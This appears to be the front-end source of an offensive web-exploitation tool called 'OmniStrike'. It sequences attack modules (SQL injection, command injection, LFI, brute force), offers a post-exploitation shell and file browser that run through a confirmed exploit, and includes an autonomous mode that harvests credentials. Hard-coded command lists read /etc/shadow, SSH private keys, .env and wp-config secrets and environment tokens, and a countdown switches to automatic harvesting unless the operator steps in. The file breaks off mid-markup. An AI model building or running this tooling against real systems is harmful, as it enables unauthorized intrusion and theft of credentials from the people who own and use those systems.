import React, { useState, useEffect, useRef, useCallback } from "react";
import { usePersistedState } from "@/hooks/usePersistedState";
import { useToast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import {
  Zap, Square, Trash2, ChevronDown, ChevronUp, Download,
  ShieldAlert, AlertTriangle, Info, RefreshCw, Copy, Terminal,
  Folder, File, FolderOpen, Home, ArrowLeft,
  Mouse, Lock, Unlock, Search, Layers, Settings2,
  ChevronUp as Up, ChevronDown as Dn, CheckCircle2, Circle,
  SkipForward, ListOrdered, Swords, Crosshair,
  Bot, UserCheck, Pause, Play, AlertOctagon, Radio,
} from "lucide-react";

const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms));

const API = "/api/omnistrike";

const CATEGORIES = [
  { id: "sqli",          label: "SQL Injection",         icon: "💉", desc: "Boolean-blind, UNION, time-based, error-based, stacked queries" },
  { id: "xss",           label: "XSS",                   icon: "🌐", desc: "Reflected and DOM-based cross-site scripting" },
  { id: "lfi",           label: "LFI / Path Traversal",  icon: "📂", desc: "File inclusion, directory traversal, PHP wrappers" },
  { id: "cmdi",          label: "Command Injection",      icon: "💀", desc: "OS command chaining, reverse shell patterns, eval injection" },
  { id: "ssrf",          label: "SSRF",                   icon: "🔄", desc: "Internal IP, localhost, cloud metadata probing" },
  { id: "xxe",           label: "XXE",                    icon: "📄", desc: "XML external entity with file:// and HTTP entities" },
  { id: "ssti",          label: "SSTI",                   icon: "🧩", desc: "Jinja2, Twig, Freemarker, Python/Ruby template injection" },
  { id: "headers",       label: "Header Injection",       icon: "📡", desc: "Host, X-Forwarded, X-Original-URL auth bypass" },
  { id: "cors",          label: "CORS Misconfiguration",  icon: "🌍", desc: "Permissive ACAO header detection across origins" },
  { id: "auth",          label: "Auth Brute Force",       icon: "🔑", desc: "Default creds against login, admin, wp-login, api/auth" },
  { id: "nosql",         label: "NoSQL Injection",        icon: "🗃️", desc: "MongoDB operator injection ($ne, $gt, $regex, $where)" },
  { id: "quantumbreach", label: "⚛ QuantumBreach",        icon: "⚛", desc: "Cache poisoning · GraphQL · CRLF · Mass assignment · JWT alg confusion · Timing side-channel · Open redirect chains · Quantum-weak crypto" },
  { id: "shadowvector",  label: "👻 ShadowVector",         icon: "👻", desc: "Novel unreported vectors — Ghost Param Injection · Path Desync · Prototype Pollution · Schema Oracle · Temporal Race Attack" },
];

const PHASES = [
  {
    id: "recon",
    label: "Phase 1 — Recon",
    icon: "🔭",
    color: "blue",
    modules: ["cors", "headers"],
    rationale: "Fingerprint CORS policy and discover auth-bypass headers before firing any payloads. Low-noise — won't trigger WAF alerts.",
  },
  {
    id: "auth_access",
    label: "Phase 2 — Auth & Access",
    icon: "🔑",
    color: "yellow",
    modules: ["auth", "lfi", "xxe"],
    rationale: "Try default credentials on discovered endpoints, then attempt file inclusion and XML entity injection for file read access.",
  },
  {
    id: "injection",
    label: "Phase 3 — Injection",
    icon: "💉",
    color: "orange",
    modules: ["sqli", "nosql", "ssrf"],
    rationale: "Database injection and server-side request forgery. Uses CORS/header findings from Phase 1 to bypass filters.",
  },
  {
    id: "execution",
    label: "Phase 4 — Code Execution",
    icon: "💀",
    color: "red",
    modules: ["cmdi", "ssti"],
    rationale: "Command injection and template engine exploitation. Highest privilege outcome — full RCE if successful.",
  },
  {
    id: "client",
    label: "Phase 5 — Client-Side",
    icon: "🌐",
    color: "purple",
    modules: ["xss"],
    rationale: "Cross-site scripting for session hijacking, account takeover, and client-side pivots.",
  },
  {
    id: "advanced",
    label: "Phase 6 — Advanced Sweep",
    icon: "⚛",
    color: "pink",
    modules: ["quantumbreach", "shadowvector"],
    rationale: "QuantumBreach cache poisoning/JWT/GraphQL + ShadowVector novel patent-pending vectors. Final deep-dive sweep.",
  },
];

const PHASE_COLORS: Record<string, string> = {
  blue:   "border-blue-700 bg-blue-950/40",
  yellow: "border-yellow-700 bg-yellow-950/40",
  orange: "border-orange-700 bg-orange-950/40",
  red:    "border-red-700 bg-red-950/40",
  purple: "border-purple-700 bg-purple-950/40",
  pink:   "border-pink-700 bg-pink-950/40",
};
const PHASE_LABEL_COLORS: Record<string, string> = {
  blue: "text-blue-300", yellow: "text-yellow-300", orange: "text-orange-300",
  red: "text-red-300", purple: "text-purple-300", pink: "text-pink-300",
};
const PHASE_BADGE_COLORS: Record<string, string> = {
  blue: "bg-blue-900 text-blue-200", yellow: "bg-yellow-900 text-yellow-200",
  orange: "bg-orange-900 text-orange-200", red: "bg-red-900 text-red-200",
  purple: "bg-purple-900 text-purple-200", pink: "bg-pink-900 text-pink-200",
};

type AutonomousEntry = {
  cmd: string;
  output: string;
  ts: string;
  kind: "cmd" | "file" | "info" | "breach";
};

const AUTO_RECON_RCE = [
  { cmd: "id && whoami",                                                                           label: "Identity & UID" },
  { cmd: "uname -a",                                                                               label: "Kernel version" },
  { cmd: "hostname && cat /etc/os-release 2>/dev/null | head -5",                                 label: "OS fingerprint" },
  { cmd: "cat /etc/passwd | head -30",                                                             label: "User accounts" },
  { cmd: "cat /etc/shadow 2>/dev/null | head -10",                                                 label: "Password hashes" },
  { cmd: "env | grep -iE 'key|secret|pass|token|db|api|aws|mysql|mongo|redis' 2>/dev/null",       label: "Sensitive env vars" },
  { cmd: "cat /var/www/html/.env 2>/dev/null || cat /app/.env 2>/dev/null || cat ~/.env 2>/dev/null", label: ".env credentials" },
  { cmd: "cat /var/www/html/config.php 2>/dev/null || cat /var/www/html/wp-config.php 2>/dev/null",   label: "Web app credentials" },
  { cmd: "find /var/www /opt /app -name '*.env' -o -name 'database.yml' -o -name 'secrets.yml' 2>/dev/null | head -10", label: "Config file sweep" },
  { cmd: "ls -la ~/.ssh/ 2>/dev/null",                                                             label: "SSH directory" },
  { cmd: "cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null",                    label: "SSH private key" },
  { cmd: "cat ~/.bash_history 2>/dev/null | tail -30",                                             label: "Command history" },
  { cmd: "ps aux | head -25",                                                                      label: "Running processes" },
  { cmd: "netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null",                                     label: "Open ports" },
  { cmd: "cat /etc/hosts",                                                                         label: "Internal network map" },
  { cmd: "ip addr 2>/dev/null || ifconfig 2>/dev/null | head -30",                                 label: "Network interfaces" },
  { cmd: "find / -perm -4000 -type f -maxdepth 6 2>/dev/null | head -15",                         label: "SUID binaries (privesc)" },
  { cmd: "cat /etc/crontab 2>/dev/null && ls /etc/cron.d/ 2>/dev/null",                           label: "Scheduled tasks" },
  { cmd: "ls -la /var/backups/ 2>/dev/null && ls -la /backup/ 2>/dev/null",                       label: "Backup directories" },
  { cmd: "find / -name '*.pem' -o -name '*.key' -o -name '*.crt' 2>/dev/null | head -10",         label: "SSL/TLS certificates" },
];

const AUTO_RECON_LFI = [
  { path: "/etc/passwd",                                           label: "User accounts" },
  { path: "/etc/shadow",                                           label: "Password hashes" },
  { path: "/etc/hosts",                                            label: "Internal network" },
  { path: "/proc/version",                                         label: "Kernel info" },
  { path: "/proc/self/environ",                                    label: "Process env vars" },
  { path: "/var/www/html/.env",                                    label: "App credentials" },
  { path: "/var/www/html/wp-config.php",                           label: "WordPress credentials" },
  { path: "/var/www/html/config.php",                              label: "App config" },
  { path: "/home/ubuntu/.bash_history",                            label: "Command history" },
  { path: "/home/ubuntu/.ssh/id_rsa",                              label: "SSH private key" },
  { path: "/home/www-data/.bash_history",                          label: "www-data history" },
  { path: "/etc/apache2/sites-enabled/000-default.conf",           label: "Apache config" },
  { path: "/etc/nginx/sites-enabled/default",                      label: "Nginx config" },
  { path: "/etc/mysql/my.cnf",                                     label: "MySQL credentials" },
  { path: "/var/log/auth.log",                                     label: "Auth log" },
];

type Finding = {
  category: string; technique: string; payload: string; url: string;
  baseUrl: string; param: string; statusCode: number; responseTime: number;
  evidence: string; severity: "critical"|"high"|"medium"|"low"; bypassed: boolean;
  canExec?: boolean; canRead?: boolean;
};

type Scan = {
  id: number; target: string; status: string; findings: Finding[];
  stats: any; successRate: number; log: string[];
  startedAt: string; completedAt?: string;
  session?: ExploitSession | null;
};

type ExploitSession = {
  scanId: number; target: string; vector: "rce"|"lfi"|"sqli";
  technique: string; baseUrl: string; param: string; workingPayload: string;
  os: string; user: string; hostname: string; cwd: string; confirmedAt: string;
};

type DirItem = { name: string; isDir: boolean; perms: string; size: string; modified: string };

type PhaseStatus = {
  phaseIdx: number;
  status: "waiting" | "running" | "done" | "skipped";
  scanId?: number;
  scan?: Scan;
  findings: number;
  confirmed: number;
};

type CustomModule = { id: string; enabled: boolean };

const SEV_COLORS: Record<string,string> = {
  critical: "bg-red-600 text-white", high: "bg-orange-500 text-white",
  medium: "bg-yellow-500 text-black", low: "bg-blue-500 text-white",
};
const SEV_ICON: Record<string, React.ReactElement> = {
  critical: <ShieldAlert className="h-4 w-4 text-red-400" />,
  high: <AlertTriangle className="h-4 w-4 text-orange-400" />,
  medium: <AlertTriangle className="h-4 w-4 text-yellow-400" />,
  low: <Info className="h-4 w-4 text-blue-400" />,
};

// ── Post-Exploitation Desktop Panel ─────────────────────────────────────────
function ExploitDesktop({ scanId, session }: { scanId: number; session: ExploitSession }) {
  const [tab, setTab] = useState<"files"|"terminal">("files");
  const [captured, setCaptured] = useState(false);
  const [currentPath, setCurrentPath] = useState("/");
  const [dirItems, setDirItems] = useState<DirItem[]>([]);
  const [fileContent, setFileContent] = useState<string|null>(null);
  const [openFile, setOpenFile] = useState<string|null>(null);
  const [pathHistory, setPathHistory] = useState<string[]>([]);
  const [loadingDir, setLoadingDir] = useState(false);
  const [loadingFile, setLoadingFile] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [cmdHistory, setCmdHistory] = useState<Array<{cmd:string;out:string;url:string}>>([]);
  const [cmdInput, setCmdInput] = useState("");
  const [execing, setExecing] = useState(false);
  const [historyIdx, setHistoryIdx] = useState(-1);
  const termRef = useRef<HTMLDivElement>(null);
  const cmdRef = useRef<HTMLInputElement>(null);
  const panelRef = useRef<HTMLDivElement>(null);
  const { toast } = useToast();

  useEffect(() => { loadDir("/"); }, []);
  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [cmdHistory]);
  useEffect(() => {
    if (captured && tab === "terminal" && cmdRef.current) cmdRef.current.focus();
  }, [captured, tab]);

  const loadDir = async (path: string) => {
    setLoadingDir(true);
    setFileContent(null); setOpenFile(null);
    try {
      const r = await fetch(`${API}/console/${scanId}/ls`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ dirPath: path }),
      });
      const d = await r.json();
      setDirItems(d.items ?? []);
      setCurrentPath(path);
    } catch { toast({ title: "Directory load failed", variant: "destructive" }); }
    setLoadingDir(false);
  };

  const navigateTo = (item: DirItem) => {
    if (!captured) return;
    if (item.isDir) {
      setPathHistory(p => [...p, currentPath]);
      const newPath = currentPath === "/" ? `/${item.name}` : `${currentPath}/${item.name}`;
      loadDir(newPath);
    } else {
      readFile(currentPath === "/" ? `/${item.name}` : `${currentPath}/${item.name}`);
    }
  };

  const readFile = async (filePath: string) => {
    setLoadingFile(true);
    try {
      const r = await fetch(`${API}/console/${scanId}/read`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ filePath }),
      });
      const d = await r.json();
      setFileContent(d.content ?? "(empty)");
      setOpenFile(filePath);
    } catch { toast({ title: "File read failed", variant: "destructive" }); }
    setLoadingFile(false);
  };

  const goBack = () => {
    if (!captured) return;
    if (openFile) { setFileContent(null); setOpenFile(null); return; }
    if (pathHistory.length > 0) {
      const prev = pathHistory[pathHistory.length - 1];
      setPathHistory(p => p.slice(0,-1));
      loadDir(prev);
    }
  };

  const goHome = () => {
    if (!captured) return;
    setPathHistory([]);
    setFileContent(null); setOpenFile(null);
    loadDir("/");
  };

  const execCmd = async () => {
    if (!cmdInput.trim() || execing) return;
    const cmd = cmdInput.trim();
    setCmdInput(""); setHistoryIdx(-1); setExecing(true);
    try {
      const r = await fetch(`${API}/console/${scanId}/exec`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: cmd }),
      });
      const d = await r.json();
      setCmdHistory(p => [...p, { cmd, out: d.output ?? "(no output)", url: d.exploitUrl ?? "" }]);
    } catch (e: any) {
      setCmdHistory(p => [...p, { cmd, out: `Error: ${e.message}`, url: "" }]);
    }
    setExecing(false);
    setTimeout(() => cmdRef.current?.focus(), 50);
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") { execCmd(); return; }
    if (e.key === "ArrowUp") {
      const cmds = cmdHistory.map(c => c.cmd);
      const newIdx = Math.min(historyIdx + 1, cmds.length - 1);
      setHistoryIdx(newIdx);
      setCmdInput(cmds[cmds.length - 1 - newIdx] ?? "");
    }
    if (e.key === "ArrowDown") {
      const cmds = cmdHistory.map(c => c.cmd);
      const newIdx = Math.max(historyIdx - 1, -1);
      setHistoryIdx(newIdx);
      setCmdInput(newIdx === -1 ? "" : (cmds[cmds.length - 1 - newIdx] ?? ""));
    }
  };

  const filteredItems = dirItems.filter(i => !searchQuery || i.name.toLowerCase().includes(searchQuery.toLowerCase()));
  const isRce = session.vector === "rce";

  return (
    <div className="bg-gray-950 border-2 border-red-700 rounded-lg overflow-hidden shadow-2xl shadow-red-900/30">
      <div className="bg-red-900/80 px-4 py-2 flex items-center gap-3 border-b border-red-700">
        <div className="flex gap-1.5">
          <div className="w-3 h-3 rounded-full bg-red-500" />
          <div className="w-3 h-3 rounded-full bg-yellow-500" />
          <div className="w-3 h-3 rounded-full bg-green-500" />
        </div>
        <span className="text-red-300 text-xs font-mono flex-1">
          COMPROMISED: {session.target} │ {session.technique} │ via ?{session.param}
        </span>
        <Badge className={`text-xs ${isRce ? "bg-red-700 text-white" : "bg-orange-800 text-orange-200"}`}>
          {isRce ? "RCE" : "LFI"}
        </Badge>
        <div className="flex items-center gap-2">
          {captured
            ? <><Lock className="h-3 w-3 text-red-400" /><span className="text-red-400 text-xs font-mono">CAPTURED</span></>
            : <><Unlock className="h-3 w-3 text-gray-400" /><span className="text-gray-400 text-xs">hover to capture</span></>
          }
        </div>
      </div>

      <div className="bg-gray-900 px-4 py-1.5 flex flex-wrap gap-4 text-xs font-mono border-b border-gray-800">
        <span className="text-gray-400">user: <span className="text-green-400">{session.user}</span></span>
        <span className="text-gray-400">host: <span className="text-cyan-400">{session.hostname}</span></span>
        <span className="text-gray-400">vector: <span className="text-red-400">{session.technique}</span></span>
        <span className="text-gray-400">confirmed: <span className="text-yellow-400">{new Date(session.confirmedAt).toLocaleTimeString()}</span></span>
      </div>

      <div className="flex border-b border-gray-800">
        {[["files", "File Browser", Folder], ["terminal", isRce ? "Command Shell" : "Read Files", Terminal]].map(([id, label, Icon]) => (
          <button key={id as string} onClick={() => setTab(id as any)}
            className={`flex items-center gap-2 px-4 py-2 text-sm border-r border-gray-800 transition-colors ${tab === id ? "bg-gray-800 text-white" : "text-gray-400 hover:bg-gray-900 hover:text-gray-200"}`}>
            <Icon className="h-4 w-4" />{label as string}
          </button>
        ))}
        <div className="flex-1" />
        <div className="px-3 py-2 text-xs text-gray-600 font-mono self-center">
          Move mouse INTO this area to enable navigation
        </div>
      </div>

      <div
        ref={panelRef}
        onMouseEnter={() => setCaptured(true)}
        onMouseLeave={() => setCaptured(false)}
        className={`relative min-h-[420px] ${captured ? "cursor-default ring-2 ring-red-500 ring-inset" : "cursor-pointer"}`}
        style={{ userSelect: captured ? "text" : "none" }}
      >
        {!captured && (
          <div className="absolute inset-0 bg-black/40 flex items-center justify-center z-10 pointer-events-none">
            <div className="text-center">
              <Mouse className="h-10 w-10 text-red-400 mx-auto mb-2" />
              <p className="text-red-300 text-sm font-medium">Move mouse here to navigate target system</p>
              <p className="text-gray-500 text-xs mt-1">Mouse outside this area = your controls | Mouse inside = target navigation</p>
            </div>
          </div>
        )}

        {tab === "files" && (
          <div className="flex h-[420px] bg-gray-950">
            <div className="w-48 border-r border-gray-800 bg-gray-900 flex flex-col">
              <div className="px-3 py-2 text-xs text-gray-500 font-mono border-b border-gray-800">QUICK ACCESS</div>
              {[
                ["/", "/ Root"], ["/etc", "/etc"], ["/etc/nginx", "nginx config"],
                ["/var/www/html", "web root"], ["/var/log", "logs"],
                ["/home", "/home"], ["/root", "/root"], ["/proc", "/proc"], ["/tmp", "/tmp"],
              ].map(([path, label]) => (
                <button key={path} onClick={() => captured && loadDir(path)}
                  className={`flex items-center gap-2 px-3 py-1.5 text-xs text-left transition-colors ${captured ? "hover:bg-gray-800 cursor-pointer" : "cursor-not-allowed"} ${currentPath === path ? "bg-gray-800 text-white" : "text-gray-400"}`}>
                  <Folder className="h-3 w-3 text-yellow-500 shrink-0" />
                  <span className="font-mono truncate">{label}</span>
                </button>
              ))}
            </div>

            <div className="flex-1 flex flex-col overflow-hidden">
              <div className="flex items-center gap-2 px-3 py-2 border-b border-gray-800 bg-gray-900">
                <button onClick={goBack} disabled={!captured || (pathHistory.length === 0 && !openFile)}
                  className="text-gray-400 hover:text-white disabled:opacity-30 disabled:cursor-not-allowed">
                  <ArrowLeft className="h-4 w-4" />
                </button>
                <button onClick={goHome} disabled={!captured} className="text-gray-400 hover:text-white disabled:opacity-30">
                  <Home className="h-4 w-4" />
                </button>
                <div className="flex-1 bg-gray-800 rounded px-3 py-1 text-xs font-mono text-gray-200 border border-gray-700 truncate">
                  {openFile ?? currentPath}
                </div>
                <div className="relative">
                  <Search className="absolute left-2 top-1.5 h-3 w-3 text-gray-500" />
                  <input value={searchQuery} onChange={e => setSearchQuery(e.target.value)} placeholder="filter..."
                    disabled={!captured}
                    className="bg-gray-800 border border-gray-700 rounded pl-6 pr-2 py-1 text-xs text-gray-200 w-28 font-mono" />
                </div>
              </div>

              <div className="flex-1 overflow-auto p-2">
                {loadingDir || loadingFile ? (
                  <div className="flex items-center gap-2 p-4 text-xs text-green-400 font-mono">
                    <RefreshCw className="h-4 w-4 animate-spin" />
                    Fetching via {session.vector.toUpperCase()} exploit...
                  </div>
                ) : openFile && fileContent !== null ? (
                  <div>
                    <div className="flex items-center gap-2 mb-2">
                      <File className="h-4 w-4 text-blue-400" />
                      <span className="text-xs text-blue-300 font-mono">{openFile}</span>
                      <button onClick={() => { navigator.clipboard.writeText(fileContent ?? ""); }}
                        className="ml-auto text-gray-500 hover:text-gray-300">
                        <Copy className="h-3.5 w-3.5" />
                      </button>
                    </div>
                    <pre className="bg-black rounded p-3 text-xs text-green-400 font-mono whitespace-pre-wrap break-all max-h-[320px] overflow-auto">
                      {fileContent || "(empty file)"}
                    </pre>
                  </div>
                ) : (
                  <div className={`grid grid-cols-3 sm:grid-cols-4 md:grid-cols-6 gap-2 ${!captured ? "pointer-events-none" : ""}`}>
                    {filteredItems.length === 0 ? (
                      <div className="col-span-6 text-center text-gray-600 text-xs py-8 font-mono">
                        {captured ? "Empty or inaccessible directory" : "Move mouse here to browse files"}
                      </div>
                    ) : filteredItems.map((item, i) => (
                      <button key={i} onDoubleClick={() => navigateTo(item)} onClick={() => navigateTo(item)}
                        title={`${item.name}\n${item.perms} ${item.size}`}
                        className={`flex flex-col items-center gap-1 p-2 rounded text-center group transition-colors ${captured ? "hover:bg-gray-800 cursor-pointer" : "cursor-not-allowed"}`}>
                        {item.isDir
                          ? <FolderOpen className="h-8 w-8 text-yellow-400 group-hover:text-yellow-300" />
                          : <File className="h-8 w-8 text-blue-400 group-hover:text-blue-300" />}
                        <span className="text-xs text-gray-300 font-mono break-all leading-tight">{item.name}</span>
                        {item.size && <span className="text-[10px] text-gray-600">{item.size}</span>}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {tab === "terminal" && (
          <div className="flex flex-col h-[420px] bg-black">
            <div ref={termRef} className="flex-1 overflow-auto p-3 font-mono text-xs">
              <div className="text-green-500 mb-3">
                {'OmniStrike Post-Exploitation Shell'}<br />
                {`Connected: ${session.target}`}<br />
                {`Vector: ${session.technique} (?${session.param})`}<br />
                {isRce ? `Mode: FULL COMMAND EXECUTION` : `Mode: FILE READ ONLY (LFI)`}<br />
                {'─'.repeat(50)}
              </div>
              {cmdHistory.length === 0 && (
                <div className="text-gray-600">
                  {isRce
                    ? `Type commands below. They are sent live through the confirmed exploit.\nTry: id, whoami, uname -a, ls -la /, cat /etc/passwd, ps aux`
                    : `LFI mode — use the file browser tab to navigate.\nOr type: /etc/passwd, /etc/hosts, /proc/version`}
                </div>
              )}
              {cmdHistory.map((entry, i) => (
                <div key={i} className="mb-3">
                  <div className="text-green-400">
                    <span className="text-cyan-500">{session.user}@{session.hostname}</span>
                    <span className="text-white">:</span>
                    <span className="text-blue-400">{session.cwd}</span>
                    <span className="text-white">$ </span>
                    <span className="text-yellow-300">{entry.cmd}</span>
                  </div>
                  <div className="text-green-300 whitespace-pre-wrap mt-0.5 pl-2">{entry.out}</div>
                  {entry.url && (
                    <div className="text-gray-700 text-[10px] mt-0.5 pl-2 break-all">
                      exploit: {entry.url.substring(0, 100)}{entry.url.length > 100 ? "..." : ""}
                    </div>
                  )}
                </div>
              ))}
              {execing && (
                <div className="text-green-400 flex items-center gap-2">
                  <RefreshCw className="h-3 w-3 animate-spin" />
                  <span>Executing via exploit...</span>
                </div>
              )}
            </div>

            <div className={`flex items-center gap-2 px-3 py-2 border-t border-gray-800 bg-gray-950 ${!captured ? "opacity-50" : ""}`}>
              <span className="text-cyan-500 font-mono text-xs shrink-0">{session.user}@{session.hostname}:{session.cwd}$</span>
              <input
                ref={cmdRef}
                value={cmdInput}
                onChange={e => setCmdInput(e.target.value)}
                onKeyDown={handleKeyDown}
                disabled={!captured || execing || !isRce}
                placeholder={!captured ? "move mouse here to type commands" : !isRce ? "switch to File Browser for LFI mode" : "enter command..."}
                className="flex-1 bg-transparent text-yellow-300 font-mono text-xs outline-none placeholder:text-gray-700"
              />
              {execing && <RefreshCw className="h-3 w-3 animate-spin text-green-400 shrink-0" />}
            </div>
          </div>
        )}
      </div>

      <div className="bg-gray-900 border-t border-gray-800 px-4 py-2 flex items-center gap-4 text-xs text-gray-500 font-mono">
        <span>Working payload: <span className="text-red-400">{session.workingPayload.substring(0,50)}{session.workingPayload.length > 50 ? "..." : ""}</span></span>
        <span className="ml-auto">param: <span className="text-cyan-400">?{session.param}</span></span>
      </div>
    </div>
  );
}

// ── Breach Alert Overlay ─────────────────────────────────────────────────────
function BreachAlertOverlay({
  session, countdown, onManual, onAutonomous,
}: {
  session: ExploitSession;
  countdown: number;
  onManual: () => void;
  onAutonomous: () => void;
}) {
  const pct = Math.max(0, (countdown / 30) * 100);
  const urgent = countdown <= 10;
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85">
      <div className={`absolute inset-0 border-4 pointer-events-none transition-colors ${urgent ? "border-red-500 animate-pulse" : "border-red-800"}`} />
      <div className="bg-gray-950 border-2 border-red-600 rounded-2xl max-w-lg w-full shadow-2xl shadow-red-900/50 overflow-hidden">

        {/* Header */}
        <div className="bg-red-900/70 border-b border-red-700 px-6 py-5 text-center">
          <div className="flex items-center justify-center gap-3 mb-2">
            <AlertOctagon className="h-7 w-7 text-red-400 animate-pulse shrink-0" />
            <span className="text-xl font-black text-red-200 tracking-widest">SYSTEM BREACH CONFIRMED</span>
            <AlertOctagon className="h-7 w-7 text-red-400 animate-pulse shrink-0" />
          </div>
          <p className="text-red-400 text-xs font-mono truncate">{session.target}</p>
        </div>

        {/* Session info grid */}
        <div className="px-6 pt-5 pb-3">
          <div className="grid grid-cols-2 gap-2 mb-4 text-xs font-mono">
            {[
              { k: "USER",    v: `${session.user}@${session.hostname}`, color: "text-green-400" },
              { k: "VECTOR",  v: session.technique,                     color: "text-red-400" },
              { k: "OS",      v: session.os || "Linux",                 color: "text-cyan-400" },
              { k: "PARAM",   v: `?${session.param}`,                   color: "text-yellow-400" },
            ].map(({ k, v, color }) => (
              <div key={k} className="bg-gray-900 border border-gray-800 rounded-lg p-2.5">
                <div className="text-gray-600 mb-0.5 text-[10px]">{k}</div>
                <div className={`font-bold truncate ${color}`}>{v}</div>
              </div>
            ))}
          </div>

          {/* Countdown bar */}
          <div className="mb-5">
            <div className="flex items-center justify-between mb-1.5">
              <span className="text-xs text-gray-400">Auto-continuing to autonomous in</span>
              <span className={`text-xl font-black font-mono tabular-nums ${urgent ? "text-red-400 animate-pulse" : "text-amber-400"}`}>
                {countdown}s
              </span>
            </div>
            <div className="w-full bg-gray-800 rounded-full h-2.5 overflow-hidden">
              <div
                className="h-2.5 rounded-full bg-gradient-to-r from-amber-500 to-red-500 transition-all duration-1000"
                style={{ width: `${pct}%` }}
              />
            </div>
          </div>

          {/* Choice buttons */}
          <div className="grid grid-cols-2 gap-3 mb-5">
            <button onClick={onManual}
              className="flex flex-col items-center gap-2 bg-blue-950/60 border border-blue-700 rounded-xl p-4 hover:bg-blue-900/60 transition-all group active:scale-95">
              <UserCheck className="h-9 w-9 text-blue-400 group-hover:text-blue-300 transition-colors" />
              <span className="text-sm font-black text-blue-300">TAKE CONTROL</span>
              <span className="text-[10px] text-blue-600 text-center leading-tight">Manual console — you drive every command</span>
            </button>
            <button onClick={onAutonomous}
              className="flex flex-col items-center gap-2 bg-red-950/60 border border-red-700 rounded-xl p-4 hover:bg-red-900/60 transition-all group active:scale-95">
              <Bot className="h-9 w-9 text-red-400 group-hover:text-red-300 animate-pulse" />
              <span className="text-sm font-black text-red-300">GO AUTONOMOUS</span>
              <span className="text-[10px] text-red-600 text-center leading-tight">System harvests credentials automatically</span>
            </button>
          </div>

          <p className="text-[10px] text-gray-600 text-center">
            You can take control at any time after choosing autonomous — the operator stays live
          </p>
        </div>
      </div>
    </div>
  );
}

// ── Autonomous Console ────────────────────────────────────────────────────────
function AutonomousConsole({
  session, log, running, paused, onTakeControl, onTogglePause,
}: {
  session: ExploitSession;
  log: AutonomousEntry[];
  running: boolean;
  paused: boolean;
  onTakeControl: () => void;
  onTogglePause: () => void;
}) {
  const termRef = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [log]);

  const findings = log.filter(e => e.kind === "breach");
  const cmdsRun  = log.filter(e => e.kind === "cmd").length;

  return (
    <div className="bg-gray-950 border-2 border-amber-700 rounded-lg overflow-hidden shadow-xl shadow-amber-900/20">
      {/* Title bar */}
      <div className="bg-amber-900/50 border-b border-amber-800 px-4 py-2.5 flex items-center gap-3">
        <Bot className={`h-5 w-5 ${running && !paused ? "text-amber-400 animate-pulse" : "text-amber-600"}`} />
        <span className="text-amber-300 font-black text-sm font-mono tracking-wider">AUTONOMOUS OPERATOR</span>
        {running && !paused && (
          <span className="flex items-center gap-1.5 text-amber-400 text-xs font-mono">
            <Radio className="h-3 w-3 animate-pulse" /> LIVE
          </span>
        )}
        {paused && <span className="text-yellow-400 text-xs font-mono">⏸ PAUSED</span>}
        {!running && <span className="text-green-400 text-xs font-mono">✓ SWEEP COMPLETE</span>}

        <div className="ml-auto flex items-center gap-2">
          {/* Findings badge */}
          {findings.length > 0 && (
            <span className="bg-red-900 border border-red-700 text-red-300 text-[10px] font-bold px-2 py-0.5 rounded-full">
              {findings.length} critical findings
            </span>
          )}
          {(running || paused) && (
            <button onClick={onTogglePause}
              className="flex items-center gap-1.5 px-3 py-1 rounded-lg text-xs font-bold border border-yellow-700 text-yellow-300 hover:bg-yellow-900/40 transition-colors">
              {paused ? <><Play className="h-3 w-3" /> Resume</> : <><Pause className="h-3 w-3" /> Pause</>}
            </button>
          )}
          <button onClick={onTakeControl}
            className="flex items-center gap-1.5 px-4 py-1.5 rounded-lg text-xs font-black bg-red-700 hover:bg-red-600 text-white transition-colors shadow-lg shadow-red-900/40 active:scale-95">
            <UserCheck className="h-3.5 w-3.5" /> TAKE CONTROL
          </button>
        </div>
      </div>

      {/* Session info */}
      <div className="bg-gray-900 px-4 py-1.5 flex flex-wrap gap-4 text-[11px] font-mono border-b border-gray-800">
        <span className="text-amber-400">auto@{session.hostname}</span>
        <span className="text-gray-500">target: <span className="text-gray-300">{session.target}</span></span>
        <span className="text-gray-500">mode: <span className="text-red-400">{session.vector.toUpperCase()}</span></span>
        <span className="text-gray-500 ml-auto">{cmdsRun} commands executed</span>
      </div>

      {/* Terminal output */}
      <div ref={termRef} className="bg-black p-4 font-mono text-xs max-h-[520px] min-h-[280px] overflow-auto">
        {/* Banner */}
        <div className="text-amber-600/80 mb-4 leading-relaxed">
          {`╔══════════════════════════════════════════════════════╗`}<br />
          {`║    OmniStrike Autonomous Post-Exploitation Engine    ║`}<br />
          {`║    Target: ${session.target.substring(0,41).padEnd(41)} ║`}<br />
          {`╚══════════════════════════════════════════════════════╝`}
        </div>

        {log.map((entry, i) => (
          <div key={i} className="mb-3">
            {entry.kind === "info" ? (
              <div className="text-amber-700 border-t border-gray-900 pt-2 mt-2 text-[10px]">{entry.cmd}</div>
            ) : entry.kind === "breach" ? (
              <div className="flex items-start gap-2 bg-red-950/50 border border-red-800 rounded px-2.5 py-1.5 text-red-300">
                <AlertOctagon className="h-3.5 w-3.5 shrink-0 mt-0.5 text-red-400" />
                <span>{entry.cmd}</span>
              </div>
            ) : (
              <>
                <div>
                  <span className="text-gray-600">[{entry.ts}] </span>
                  <span className="text-amber-500">auto$ </span>
                  <span className="text-white">{entry.cmd}</span>
                </div>
                {entry.output && (
                  <pre className="text-green-300 whitespace-pre-wrap pl-4 mt-0.5 break-all text-[11px] leading-relaxed">
                    {entry.output.substring(0, 1000)}{entry.output.length > 1000 ? "\n...(truncated)" : ""}
                  </pre>
                )}
              </>
            )}
          </div>
        ))}

        {running && !paused && (
